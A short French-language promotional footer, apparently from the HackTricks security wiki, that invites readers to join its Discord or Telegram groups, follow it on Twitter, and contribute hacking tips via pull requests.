* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
